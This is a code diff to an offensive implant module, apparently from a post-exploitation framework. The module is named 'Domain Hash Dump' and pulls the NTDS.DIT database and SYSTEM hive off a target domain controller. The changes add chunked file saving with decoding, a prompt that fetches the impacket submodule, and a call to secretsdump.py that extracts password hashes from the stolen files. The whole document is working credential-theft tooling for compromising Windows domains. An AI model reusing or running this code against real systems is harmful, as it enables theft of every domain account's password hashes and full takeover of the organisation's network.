@@ -6,6 +6,7 @@ class HashDumpDCImplant(core.implant.Implant):
     NAME = "Domain Hash Dump"
     DESCRIPTION = "Dumps the NTDS.DIT off the target domain controller."
     AUTHORS = ["zerosum0x0", "Aleph-Naught-"]
+    STATE = "implant/gather/hashdump_dc"
 
     def load(self):
         self.options.register("LPATH", "/tmp/", "local file save path")
@@ -17,27 +18,69 @@ class HashDumpDCImplant(core.implant.Implant):
         self.options.register("NTDSFILE", "", "random uuid for NTDS file name", hidden=True)
         self.options.register("SYSHFILE", "", "random uuid for SYSTEM hive file name", hidden=True)
 
+    def job(self):
+        return HashDumpDCJob
+
     def run(self):
+
+        import os.path
+        if not os.path.isfile("data/impacket/examples/secretsdump.py"):
+            old_prompt = self.shell.prompt
+            old_clean_prompt = self.shell.clean_prompt
+            self.shell.prompt = "Would you like me to get it for you? y/N: "
+            self.shell.clean_prompt = self.shell.prompt
+
+            self.shell.print_warning("It doesn't look like you have the impacket submodule installed yet! This module will fail if you don't have it!")
+            try:
+                import readline
+                readline.set_completer(None)
+                option = self.shell.get_command(self.shell.prompt)
+                if option.lower() == "y":
+                    from subprocess import call
+                    call(["git", "submodule", "init"])
+                    call(["git", "submodule", "update"])
+            except KeyboardInterrupt:
+                self.shell.print_plain(self.shell.clean_prompt)
+                return
+            finally:
+                self.shell.prompt = old_prompt
+                self.shell.clean_prompt = old_clean_prompt
+
         # generate new file every time this is run
         self.options.set("NTDSFILE", uuid.uuid4().hex)
         self.options.set("SYSHFILE", uuid.uuid4().hex)
+        self.options.set("RPATH", self.options.get('RPATH').replace("\\", "\\\\").replace('"', '\\"'))
 
         payloads = {}
         payloads["js"] = self.loader.load_script("data/implant/gather/hashdump_dc.js", self.options)
 
-        self.dispatch(payloads, HashDumpDCJob)
+        self.dispatch(payloads, self.job)
 
 class HashDumpDCJob(core.job.Job):
 
-    def save_file(self, data, decode = True):
+    def save_file(self, data, name, encoder, decode = True):
         import uuid
-        save_fname = self.options.get("LPATH") + "/" + uuid.uuid4().hex
+        import os
+        save_fname = self.options.get("LPATH") + "/" + name + "." + self.session.ip + "." + uuid.uuid4().hex
         save_fname = save_fname.replace("//", "/")
 
-        with open(save_fname, "wb") as f:
-            if decode:
-                data = self.decode_downloaded_data(data)
-            f.write(data)
+        i = 0
+        step = 10000000
+        partfiles = []
+        while i < len(data):
+            with open(save_fname+str(i), "wb") as f:
+                partfiles.append(save_fname+str(i))
+                pdata = data
+                if decode:
+                    pdata = self.decode_downloaded_data(pdata[i:i+step], encoder)
+                f.write(pdata)
+            i += step
+
+        with open(save_fname, "wb+") as f:
+            for p in partfiles:
+                f.write(open(p, "rb").read())
+                os.remove(p)
+
 
         return save_fname
 
@@ -49,6 +92,7 @@ class HashDumpDCJob(core.job.Job):
 
             self.print_status("received SYSTEM hive (%d bytes)" % len(data))
             self.system_data = data
+            self.system_encoder = handler.get_header("encoder", False)
             return
 
         if task == self.options.get("NTDSFILE"):
@@ -56,6 +100,7 @@ class HashDumpDCJob(core.job.Job):
 
             self.print_status("received NTDS.DIT file (%d bytes)" % len(data))
             self.ntds_data = data
+            self.ntds_encoder = handler.get_header("encoder", False)
             return
 
         # dump ntds.dit here
@@ -66,22 +111,24 @@ class HashDumpDCJob(core.job.Job):
         handler.reply(200)
 
     def finish_up(self):
-        self.ntds_file = self.save_file(self.ntds_data)
+        self.ntds_file = self.save_file(self.ntds_data, 'NTDS', self.ntds_encoder)
         self.print_status("decoded NTDS.DIT file (%s)" % self.ntds_file)
 
-        self.system_file = self.save_file(self.system_data)
+        self.system_file = self.save_file(self.system_data, 'SYSTEM', self.system_encoder)
         self.print_status("decoded SYSTEM hive (%s)" % self.system_file)
 
         from subprocess import Popen, PIPE, STDOUT
 
-        cmd = 'secretsdump.py -ntds %s -system %s -hashes LMHASH:NTHASH LOCAL' % (self.ntds_file, self.system_file)
-        p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+        path = "data/impacket/examples/secretsdump.py"
+        cmd = ['python2', path, '-ntds', self.ntds_file, '-system', self.system_file, '-hashes', 'LMHASH:NTHASH', 'LOCAL']
+        p = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True, env={"PYTHONPATH": "./data/impacket"})
         output = p.stdout.read()
         #self.shell.print_plain(output.decode())
-        self.dump_file = self.save_file(output, False)
+        self.dump_file = self.save_file(output, 'DCDUMP', False)
         super(HashDumpDCJob, self).report(None, "", False)
 
     def done(self):
+        self.results = self.dump_file
         self.display()
         #pass
 
